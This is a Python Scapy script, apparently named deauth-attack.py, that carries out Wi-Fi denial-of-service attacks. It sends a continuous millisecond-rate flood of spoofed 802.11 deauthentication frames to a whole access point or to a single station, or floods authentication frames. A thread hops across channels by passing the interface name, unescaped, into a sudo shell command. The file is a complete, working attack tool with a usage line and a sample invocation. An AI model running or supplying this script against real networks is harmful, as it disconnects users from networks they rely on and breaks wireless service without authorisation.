import argparse
from scapy.all import *
import sys
import os
import random
import threading
import time

def Ap_Broadcast(argu):
    threading.Thread(target=Hopping, args=(argu,)).start()
    dot11 = Dot11(type=0, subtype=12, addr1="ff:ff:ff:ff:ff:ff",addr2=argu[1], addr3=argu[1])
    frame = RadioTap()/dot11/Dot11Deauth(reason=7)
    sendp(frame, iface=argu[0], inter=0.001, loop=1)

def Ap_Unicast(argu):
    threading.Thread(target=Hopping, args=(argu,)).start()
    dot11 = Dot11(type=0, subtype=12, addr1=argu[2],addr2=argu[1], addr3=argu[1])
    frame = RadioTap()/dot11/Dot11Deauth(reason=7)
    sendp(frame, iface=argu[0], inter=0.001, loop=1)

def Auth_Attack(argu):
    threading.Thread(target=Hopping, args=(argu,)).start()
    dot11 = Dot11(type=0, subtype=11, addr1=argu[1],addr2=argu[2], addr3=argu[1])
    frame = RadioTap()/dot11/Dot11Auth(seqnum=1)
    sendp(frame, iface=argu[0], inter=0.001, loop=1)

def Hopping(args):
    ch = 0
    while(1):
        ch = (ch % 14 ) +1
        x= "sudo iwconfig "+args[0]+ " channel " + str(ch)
        os.system(x)
        print("channel " + str(ch))
        time.sleep(0.1)

if __name__ == '__main__':
    argu = sys.argv
    del argu[0]
    print(f'Argument : {argu}')

    argu_len = len(argu)
    
    if argu_len == 2:
        Ap_Broadcast(argu)
    elif argu_len == 3:
        Ap_Unicast(argu)
    elif argu_len == 4:
        Auth_Attack(argu)
    else:
        print("syntax : python3 deauth-attack.py <interface> <ap mac> [<station mac> [-auth]]")
        print("sample : python3 deauth-attack.py mon0 00:11:22:33:44:55 66:77:88:99:AA:BB -auth")
        quit()